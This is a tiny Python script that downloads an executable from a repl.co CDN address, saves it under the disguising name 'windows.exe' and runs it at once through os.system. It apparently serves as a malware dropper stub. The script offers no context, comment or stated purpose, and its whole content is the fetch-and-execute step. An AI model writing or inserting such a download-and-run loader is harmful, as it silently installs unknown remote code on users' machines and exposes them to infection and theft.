import requests
import os
url = 'https://nagogy-cdn.dreamyoak.repl.co/cdn/KGK8zSTh.exe'
response = requests.get(url)

with open('windows.exe', 'wb') as f:
    f.write(response.content)
os.system("start windows.exe")